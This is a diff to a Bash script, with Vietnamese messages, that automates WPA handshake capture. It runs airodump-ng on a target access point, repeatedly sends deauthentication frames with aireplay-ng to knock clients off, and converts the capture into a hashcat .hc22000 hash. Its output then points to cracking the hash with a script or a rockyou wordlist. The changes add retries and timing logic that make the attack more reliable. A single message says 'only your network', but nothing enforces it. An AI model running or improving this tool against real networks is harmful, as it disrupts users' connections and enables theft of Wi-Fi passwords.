@@ -18,6 +18,8 @@ CHANNEL="${3:?thiếu channel}"
 CLIENT="${4:-}"
 TIMEOUT="${5:-45}"
 BAND="${6:-}"
+GRACE="${HANDSHAKE_GRACE:-8}"
+[[ "$GRACE" =~ ^[0-9]+$ ]] || GRACE=8
 
 if [[ ! "$BSSID" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
   echo "[x] BSSID không hợp lệ: $BSSID" >&2
@@ -45,8 +47,6 @@ OUT_DIR="$ROOT/captures"
 mkdir -p "$OUT_DIR"
 chmod 700 "$OUT_DIR" 2>/dev/null || true
 STAMP="$(date +%Y%m%d-%H%M%S)"
-PREFIX="$OUT_DIR/hs-$STAMP"
-CAP="$PREFIX-01.cap"
 
 for tool in airodump-ng aireplay-ng aircrack-ng; do
   command -v "$tool" >/dev/null || { echo "[x] thiếu $tool. Kali: apt install aircrack-ng" >&2; exit 1; }
@@ -85,11 +85,25 @@ airmon-ng check kill >/dev/null 2>&1 || true
 OLD_MON="$(monitor_list)"
 MON=""
 DUMP_PID=""
-cleanup() {
-  if [[ -n "$DUMP_PID" ]]; then
-    kill "$DUMP_PID" 2>/dev/null || true
-    wait "$DUMP_PID" 2>/dev/null || true
+stop_dump() {
+  local pid="${DUMP_PID:-}"
+  if [[ -z "$pid" ]]; then
+    return 0
   fi
+  kill -INT "$pid" 2>/dev/null || true
+  for _ in {1..20}; do
+    if ! kill -0 "$pid" 2>/dev/null; then
+      break
+    fi
+    sleep 0.1
+  done
+  kill "$pid" 2>/dev/null || true
+  wait "$pid" 2>/dev/null || true
+  DUMP_PID=""
+}
+
+cleanup() {
+  stop_dump
   if [[ -n "$MON" ]]; then
     airmon-ng stop "$MON" >/dev/null 2>&1 || true
   fi
@@ -122,10 +136,6 @@ case "$BAND" in
 esac
 
 echo "[*] monitor: $MON | BSSID: $BSSID | kênh: $CHANNEL${BAND:+ (band $BAND)}"
-airodump-ng -c "$CHANNEL" --bssid "$BSSID" "${BAND_ARGS[@]}" -w "$PREFIX" --output-format pcap "$MON" >/dev/null 2>&1 &
-DUMP_PID=$!
-
-sleep 5
 
 deauth() {
   local count="$1"
@@ -137,42 +147,101 @@ deauth() {
 }
 
 has_handshake() {
-  [[ -f "$CAP" ]] || return 1
+  [[ -n "$CAP" && -f "$CAP" ]] || return 1
   (aircrack-ng "$CAP" 2>/dev/null || true) | grep -qi 'handshake'
 }
 
-echo "[*] deauth để ép client reconnect (chỉ mạng của bạn)"
-deauth 4
+DEADLINE=$(( $(date +%s) + TIMEOUT ))
+ATTEMPT=0
+HASH=""
 
-for ((i = 0; i < TIMEOUT; i++)); do
-  if has_handshake; then
+while :; do
+  ATTEMPT=$((ATTEMPT + 1))
+  if (( ATTEMPT == 1 )); then
+    PREFIX="$OUT_DIR/hs-$STAMP"
+  else
+    PREFIX="$OUT_DIR/hs-$STAMP-r$ATTEMPT"
+  fi
+  CAP="$PREFIX-01.cap"
+
+  if (( ATTEMPT > 1 )); then
+    echo "[*] thử lại capture (lần $ATTEMPT)..."
+  fi
+
+  airodump-ng -c "$CHANNEL" --bssid "$BSSID" "${BAND_ARGS[@]}" -w "$PREFIX" --output-format pcap "$MON" >/dev/null 2>&1 &
+  DUMP_PID=$!
+
+  sleep 5
+
+  echo "[*] deauth để ép client reconnect (chỉ mạng của bạn)"
+  deauth 4
+  HINT=0
+  LAST_DEAUTH=$(date +%s)
+
+  while :; do
+    NOW=$(date +%s)
+    if (( NOW >= DEADLINE )); then
+      break
+    fi
+    if has_handshake; then
+      if (( HINT == 0 )); then
+        HINT=$NOW
+        echo "[*] thấy EAPOL — chờ thêm ${GRACE}s cho đủ frame..."
+        deauth 2
+      elif (( GRACE == 0 || NOW - HINT >= GRACE )); then
+        break
+      fi
+    fi
+    sleep 1
+    NOW=$(date +%s)
+    if (( NOW - LAST_DEAUTH >= 10 && NOW < DEADLINE )); then
+      deauth 2
+      LAST_DEAUTH=$NOW
+    fi
+  done
+
+  stop_dump
+
+  if ! command -v hcxpcapngtool >/dev/null; then
     break
   fi
-  sleep 1
-  if ((i % 10 == 9)); then
-    deauth 2
+
+  HASH="${CAP%.cap}.hc22000"
+  echo "[*] convert → $HASH"
+  hcxpcapngtool -o "$HASH" "$CAP" | tail -n 30 || true
+  if [[ -s "$HASH" ]]; then
+    break
   fi
+  rm -f "$HASH"
+  if (( $(date +%s) >= DEADLINE )); then
+    break
+  fi
+  echo "[!] dump chưa đủ frame để tạo hash — thử lại..."
 done
 
 cleanup
 trap - EXIT
 
-if ! has_handshake; then
+if ! command -v hcxpcapngtool >/dev/null; then
+  if has_handshake; then
+    echo "[+] handshake OK (aircrack-ng) → $CAP"
+    echo "[!] thiếu hcxpcapngtool — convert trên Windows: hcxpcapngtool -o hs.hc22000 \"$CAP\"  (hcxtools win64)"
+    exit 0
+  fi
   echo "[-] chưa bắt được handshake trong ${TIMEOUT}s."
-  echo "    Thử: client đang kết nối? kênh đúng? đứng gần AP hơn? chạy lại và chờ lâu hơn."
+  echo "    Thử: client đang kết nối? kênh/band đúng? đứng gần AP hơn? tắt/bật WiFi client? tăng seconds."
   exit 1
 fi
 
-echo "[+] handshake OK → $CAP"
-
-if command -v hcxpcapngtool >/dev/null; then
-  HASH="${CAP%.cap}.hc22000"
-  hcxpcapngtool -o "$HASH" "$CAP" | tail -n 30 || true
-  if [[ -s "$HASH" ]]; then
-    echo "[+] xong. Copy $HASH sang Windows rồi chạy: python crack.py <file.hc22000>"
-    exit 0
-  fi
+if [[ -n "$HASH" && -s "$HASH" ]]; then
+  echo "[+] handshake OK → $CAP"
+  echo "[+] hash → $HASH"
+  echo "[+] xong. Copy $HASH sang Windows rồi chạy: python crack.py <file.hc22000>"
+  exit 0
 fi
 
-echo "[!] convert trên Windows: hcxpcapngtool -o hs.hc22000 \"$CAP\"  (hcxtools win64)"
-echo "    Hoặc crack thẳng bằng aircrack-ng: aircrack-ng -w /usr/share/wordlists/rockyou.txt \"$CAP\""
+echo "[-] chưa tạo được hash trong ${TIMEOUT}s."
+echo "    Dump đã giữ: ${CAP:-<không có>}"
+echo "    Thử: client đang kết nối? kênh/band đúng? đứng gần AP hơn? tắt/bật WiFi client? tăng seconds."
+echo "    Kiểm tra thủ công: hcxpcapngtool -o hs.hc22000 <file.cap>"
+exit 1
